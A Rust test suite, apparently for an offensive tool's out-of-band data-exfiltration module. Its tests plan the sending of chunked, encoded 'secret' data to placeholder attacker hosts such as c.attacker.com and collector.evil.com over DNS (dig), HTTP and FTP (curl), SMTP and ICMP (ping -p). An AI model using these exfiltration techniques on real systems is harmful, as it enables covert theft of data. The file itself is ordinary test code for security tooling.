use crate::oob_exfil::*;

// =========================================================================
// Egress detection
// =========================================================================

#[test]
fn test_detect_egress_linux() {
    let profile = detect_egress_capabilities("linux");
    assert!(profile.dns_available);
    assert!(profile.http_outbound);
    assert!(profile.smtp_outbound);
    assert!(profile.ftp_outbound);
    assert!(profile.icmp_allowed);
    assert!(profile.available_channels.contains(&OobChannel::Dns));
    assert!(
        profile
            .available_channels
            .contains(&OobChannel::HttpCallback)
    );
    assert!(profile.available_channels.contains(&OobChannel::Smtp));
    assert!(profile.available_channels.contains(&OobChannel::Ftp));
    assert!(profile.available_channels.contains(&OobChannel::IcmpTunnel));
    assert_eq!(profile.preferred_channel, OobChannel::HttpCallback);
    assert_eq!(profile.max_payload_size[&OobChannel::Dns], 253);
    assert_eq!(profile.max_payload_size[&OobChannel::IcmpTunnel], 1_400);
}

#[test]
fn test_detect_egress_windows() {
    let profile = detect_egress_capabilities("Windows Server 2022");
    assert!(profile.dns_available);
    assert!(profile.http_outbound);
    assert!(!profile.smtp_outbound);
    assert!(profile.ftp_outbound);
    assert!(!profile.icmp_allowed);
    assert!(!profile.available_channels.contains(&OobChannel::IcmpTunnel));
    assert!(!profile.available_channels.contains(&OobChannel::Smtp));
    assert!(profile.available_channels.contains(&OobChannel::Dns));
}

// =========================================================================
// Channel selection
// =========================================================================

#[test]
fn test_select_optimal_channel_small_data() {
    let profile = detect_egress_capabilities("linux");
    let channel = select_optimal_channel(&profile, 512);
    assert_eq!(channel, OobChannel::Dns);
}

#[test]
fn test_select_optimal_channel_medium_data() {
    let profile = detect_egress_capabilities("linux");
    let channel = select_optimal_channel(&profile, 100_000);
    assert_eq!(channel, OobChannel::HttpCallback);
}

#[test]
fn test_select_optimal_channel_large_data() {
    let profile = detect_egress_capabilities("linux");
    let channel = select_optimal_channel(&profile, 5_000_000);
    assert_eq!(channel, OobChannel::Ftp);
}

#[test]
fn test_select_optimal_channel_falls_back() {
    let profile = EgressProfile {
        available_channels: vec![OobChannel::Smtp],
        preferred_channel: OobChannel::Smtp,
        dns_available: false,
        http_outbound: false,
        smtp_outbound: true,
        ftp_outbound: false,
        icmp_allowed: false,
        max_payload_size: std::collections::HashMap::new(),
    };
    let channel = select_optimal_channel(&profile, 5_000_000);
    assert_eq!(channel, OobChannel::Smtp);
}

// =========================================================================
// DNS exfil generation
// =========================================================================

#[test]
fn test_dns_exfil_generation() {
    let data = b"secret-database-contents";
    let config = OobExfilConfig {
        collector_host: "c.attacker.com".into(),
        channel: OobChannel::Dns,
        chunk_size: 30,
        delay_between_chunks_ms: 100,
        encoding: DataEncoding::Hex,
        max_retries: 3,
    };
    let plan = generate_dns_exfil_commands(data, &config).unwrap();
    assert_eq!(plan.channel, OobChannel::Dns);
    assert!(!plan.chunks.is_empty());
    assert_eq!(plan.total_data_size, data.len());
    assert!(!plan.checksum.is_empty());

    for chunk in &plan.chunks {
        assert!(chunk.transmission_command.contains("dig"));
        assert!(chunk.transmission_command.contains("c.attacker.com"));
        assert_eq!(chunk.channel, OobChannel::Dns);
    }

    let first = &plan.chunks[0];
    assert_eq!(first.sequence, 0);
    assert!(first.transmission_command.contains("s00-"));
}

// =========================================================================
// HTTP callback generation
// =========================================================================

#[test]
fn test_http_callback_generation() {
    let data = b"exfiltrated-data-via-http";
    let config = OobExfilConfig {
        collector_host: "collector.evil.com".into(),
        channel: OobChannel::HttpCallback,
        chunk_size: 1024,
        delay_between_chunks_ms: 50,
        encoding: DataEncoding::Base64,
        max_retries: 2,
    };
    let plan = generate_http_callback_commands(data, &config).unwrap();
    assert_eq!(plan.channel, OobChannel::HttpCallback);
    assert_eq!(plan.chunks.len(), 1);
    assert_eq!(plan.total_data_size, data.len());

    let chunk = &plan.chunks[0];
    assert!(chunk.transmission_command.contains("curl"));
    assert!(chunk.transmission_command.contains("collector.evil.com"));
    assert!(chunk.transmission_command.contains("/exfil/0"));
    assert_eq!(chunk.channel, OobChannel::HttpCallback);
}

// =========================================================================
// SMTP exfil generation
// =========================================================================

#[test]
fn test_smtp_exfil_generation() {
    let data = b"smtp-exfil-payload";
    let config = OobExfilConfig {
        collector_host: "mail.evil.com".into(),
        channel: OobChannel::Smtp,
        chunk_size: 512,
        delay_between_chunks_ms: 200,
        encoding: DataEncoding::Hex,
        max_retries: 1,
    };
    let plan = generate_smtp_exfil_commands(data, &config).unwrap();
    assert_eq!(plan.channel, OobChannel::Smtp);
    assert!(!plan.chunks.is_empty());

    for chunk in &plan.chunks {
        assert!(chunk.transmission_command.contains("smtplib"));
        assert!(chunk.transmission_command.contains("mail.evil.com"));
        assert_eq!(chunk.channel, OobChannel::Smtp);
    }
}

// =========================================================================
// FTP exfil generation
// =========================================================================

#[test]
fn test_ftp_exfil_generation() {
    let data = b"ftp-upload-contents";
    let config = OobExfilConfig {
        collector_host: "ftp.evil.com".into(),
        channel: OobChannel::Ftp,
        chunk_size: 256,
        delay_between_chunks_ms: 150,
        encoding: DataEncoding::Base32,
        max_retries: 2,
    };
    let plan = generate_ftp_exfil_commands(data, &config).unwrap();
    assert_eq!(plan.channel, OobChannel::Ftp);
    assert!(!plan.chunks.is_empty());

    for chunk in &plan.chunks {
        assert!(chunk.transmission_command.contains("curl"));
        assert!(chunk.transmission_command.contains("ftp://"));
        assert!(chunk.transmission_command.contains("ftp.evil.com"));
        assert_eq!(chunk.channel, OobChannel::Ftp);
    }
}

// =========================================================================
// ICMP tunnel generation
// =========================================================================

#[test]
fn test_icmp_tunnel_generation() {
    let data = b"icmp-covert-data";
    let config = OobExfilConfig {
        collector_host: "10.0.0.1".into(),
        channel: OobChannel::IcmpTunnel,
        chunk_size: 64,
        delay_between_chunks_ms: 500,
        encoding: DataEncoding::Hex,
        max_retries: 1,
    };
    let plan = generate_icmp_tunnel_commands(data, &config).unwrap();
    assert_eq!(plan.channel, OobChannel::IcmpTunnel);
    assert!(!plan.chunks.is_empty());

    for chunk in &plan.chunks {
        assert!(chunk.transmission_command.contains("ping"));
        assert!(chunk.transmission_command.contains("-p"));
        assert!(chunk.transmission_command.contains("10.0.0.1"));
        assert_eq!(chunk.channel, OobChannel::IcmpTunnel);
    }
}

// =========================================================================
// Master dispatcher
// =========================================================================

#[test]
fn test_plan_exfiltration_dispatches_correctly() {
    let data = b"dispatch-test";

    let channels = [
        OobChannel::Dns,
        OobChannel::HttpCallback,
        OobChannel::Smtp,
        OobChannel::Ftp,
        OobChannel::IcmpTunnel,
    ];

    for &ch in &channels {
        let config = OobExfilConfig {
            collector_host: "c.test.com".into(),
            channel: ch,
            chunk_size: 256,
            delay_between_chunks_ms: 10,
            encoding: DataEncoding::Hex,
            max_retries: 1,
        };
        let plan = plan_exfiltration(data, &config).unwrap();
        assert_eq!(
            plan.channel, ch,
            "plan channel should match config for {ch}"
        );
        assert!(!plan.chunks.is_empty());
        assert_eq!(plan.total_data_size, data.len());
    }
}

// =========================================================================
// Chunking
// =========================================================================

#[test]
fn test_chunking_respects_limits() {
    let data = vec![0xAB; 500];
    let config = OobExfilConfig {
        collector_host: "c.test.com".into(),
        channel: OobChannel::HttpCallback,
        chunk_size: 64,
        delay_between_chunks_ms: 0,
        encoding: DataEncoding::Hex,
        max_retries: 0,
    };
    let plan = generate_http_callback_commands(&data, &config).unwrap();
    assert!(plan.chunks.len() > 1);

    for chunk in &plan.chunks {
        assert!(
            chunk.encoded_payload.len() <= 64,
            "chunk payload {} exceeds limit 64",
            chunk.encoded_payload.len()
        );
    }
}

#[test]
fn test_chunking_sequence_numbers_are_contiguous() {
    let data = vec![0xFF; 300];
    let config = OobExfilConfig {
        collector_host: "c.test.com".into(),
        channel: OobChannel::Ftp,
        chunk_size: 32,
        delay_between_chunks_ms: 0,
        encoding: DataEncoding::Hex,
        max_retries: 0,
    };
    let plan = generate_ftp_exfil_commands(&data, &config).unwrap();
    for (i, chunk) in plan.chunks.iter().enumerate() {
        assert_eq!(chunk.sequence, i as u32);
        assert_eq!(chunk.total_chunks, plan.chunks.len() as u32);
    }
}

// =========================================================================
// Encoding roundtrip
// =========================================================================

#[test]
fn test_encoding_roundtrip_base64() {
    let original = b"The quick brown fox jumps over the lazy dog";
    let encoded = super::oob_exfil::encode_data(original, DataEncoding::Base64);
    let decoded = super::oob_exfil::decode_data(&encoded, DataEncoding::Base64).unwrap();
    assert_eq!(decoded, original);
}

#[test]
fn test_encoding_roundtrip_hex() {
    let original: Vec<u8> = (0..=255).collect();
    let encoded = super::oob_exfil::encode_data(&original, DataEncoding::Hex);
    let decoded = super::oob_exfil::decode_data(&encoded, DataEncoding::Hex).unwrap();
    assert_eq!(decoded, original);
}

#[test]
fn test_encoding_roundtrip_base32() {
    let original = b"binary\x00\xff\x80data";
    let encoded = super::oob_exfil::encode_data(original, DataEncoding::Base32);
    let decoded = super::oob_exfil::decode_data(&encoded, DataEncoding::Base32).unwrap();
    assert_eq!(decoded, original.to_vec());
}

// =========================================================================
// Error cases
// =========================================================================

#[test]
fn test_empty_collector_host_is_invalid() {
    let config = OobExfilConfig {
        collector_host: String::new(),
        channel: OobChannel::Dns,
        chunk_size: 64,
        delay_between_chunks_ms: 0,
        encoding: DataEncoding::Hex,
        max_retries: 0,
    };
    let result = plan_exfiltration(b"data", &config);
    assert!(matches!(result, Err(OobExfilError::InvalidConfig(_))));
}

#[test]
fn test_zero_chunk_size_is_invalid() {
    let config = OobExfilConfig {
        collector_host: "c.test.com".into(),
        channel: OobChannel::Dns,
        chunk_size: 0,
        delay_between_chunks_ms: 0,
        encoding: DataEncoding::Hex,
        max_retries: 0,
    };
    let result = plan_exfiltration(b"data", &config);
    assert!(matches!(result, Err(OobExfilError::InvalidConfig(_))));
}

// =========================================================================
// Display impls
// =========================================================================

#[test]
fn test_channel_display() {
    assert_eq!(format!("{}", OobChannel::Dns), "dns");
    assert_eq!(format!("{}", OobChannel::HttpCallback), "http-callback");
    assert_eq!(format!("{}", OobChannel::Smtp), "smtp");
    assert_eq!(format!("{}", OobChannel::Ftp), "ftp");
    assert_eq!(format!("{}", OobChannel::IcmpTunnel), "icmp-tunnel");
}

#[test]
fn test_encoding_display() {
    assert_eq!(format!("{}", DataEncoding::Base64), "base64");
    assert_eq!(format!("{}", DataEncoding::Hex), "hex");
    assert_eq!(format!("{}", DataEncoding::Base32), "base32");
}

#[test]
fn test_error_display() {
    let err = OobExfilError::NoAvailableChannel;
    assert!(format!("{err}").contains("no egress"));

    let err = OobExfilError::PayloadTooLarge("10GB".into());
    assert!(format!("{err}").contains("10GB"));

    let err = OobExfilError::ChannelUnavailable(OobChannel::IcmpTunnel);
    assert!(format!("{err}").contains("icmp-tunnel"));

    let err = OobExfilError::InvalidConfig("bad".into());
    assert!(format!("{err}").contains("bad"));
}

// =========================================================================
// Checksum consistency
// =========================================================================

#[test]
fn test_checksum_is_consistent() {
    let data = b"checksum-test-data";
    let config = OobExfilConfig {
        collector_host: "c.test.com".into(),
        channel: OobChannel::HttpCallback,
        chunk_size: 1024,
        delay_between_chunks_ms: 0,
        encoding: DataEncoding::Hex,
        max_retries: 0,
    };
    let plan1 = plan_exfiltration(data, &config).unwrap();
    let plan2 = plan_exfiltration(data, &config).unwrap();
    assert_eq!(plan1.checksum, plan2.checksum);
    assert!(!plan1.checksum.is_empty());
    assert_eq!(plan1.checksum.len(), 8);
}

// =========================================================================
// Reassembly instructions present
// =========================================================================

#[test]
fn test_reassembly_instructions_present() {
    let data = b"reassemble-me";
    let channels = [
        OobChannel::Dns,
        OobChannel::HttpCallback,
        OobChannel::Smtp,
        OobChannel::Ftp,
        OobChannel::IcmpTunnel,
    ];
    for &ch in &channels {
        let config = OobExfilConfig {
            collector_host: "c.test.com".into(),
            channel: ch,
            chunk_size: 256,
            delay_between_chunks_ms: 0,
            encoding: DataEncoding::Hex,
            max_retries: 0,
        };
        let plan = plan_exfiltration(data, &config).unwrap();
        assert!(
            !plan.reassembly_instructions.is_empty(),
            "reassembly instructions missing for {ch}"
        );
    }
}
